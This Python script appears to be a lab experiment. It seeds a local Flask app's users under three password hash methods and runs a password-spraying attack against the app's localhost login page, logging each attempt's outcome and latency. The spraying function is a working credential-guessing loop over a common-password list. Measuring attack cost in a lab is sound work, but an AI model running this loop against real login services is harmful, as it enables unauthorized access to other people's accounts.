from app import app, db, User
import util
import multiprocessing
import time
from datetime import datetime
import csv
import requests

LOGIN_URL = "http://127.0.0.1:5000/login"
USERS = util.users_list()

hash_list = ["pbkdf2:sha256","bcrypt","argon2id"]

def run_server():
    # Run without debug/reloader to avoid subprocess issues
    app.run(debug=False, use_reloader=False)
def password_spraying(hash_method):
    
    with open("common_passwords.csv", newline="", encoding="utf-8") as f:
        reader = csv.reader(f)

        for row in reader:
            password = row[0]

            for user in USERS:
                timestamp = datetime.utcnow().isoformat() + "Z"
                start = time.perf_counter()
                response = requests.post(
                    LOGIN_URL,
                    data={
                        "username": user,
                        "password": password
                    }
                )
                success = "/dashboard" in response.url
                latency_ms = (time.perf_counter() - start) * 1000
                util.log_attempt({
                    "timestamp": timestamp,
                    "username": user,
                    "password": password,
                    "status": "success" if success else "fail",
                    "latency_ms": latency_ms
                }, "json_logs/spray_results_"+hash_method+".json" )

                time.sleep(0.05) 

if __name__ == '__main__':
    for hash_method in hash_list:
        print(f"--- Testing Hash Method: {hash_method} ---")
        with app.app_context():
            db.drop_all() # Clear previous data
            db.create_all()
            users = util.users_pass_list()
            for user in users:
                username = user['username']
                password = user['password']
                
                new_user = User(username=username)
                new_user.set_password(password, hash_method)
                db.session.add(new_user)
            db.session.commit()

        # Start server in a separate process
        server_process = multiprocessing.Process(target=run_server)
        server_process.start()
        
        # Wait a moment for the server to initialize
        time.sleep(2)
        
        try:
            # Run the attack script
            password_spraying(hash_method)
        except Exception as e:
            print(f"An error occurred during spraying: {e}")
        
        # Terminate the server process to prepare for the next loop
        server_process.terminate()
        server_process.join()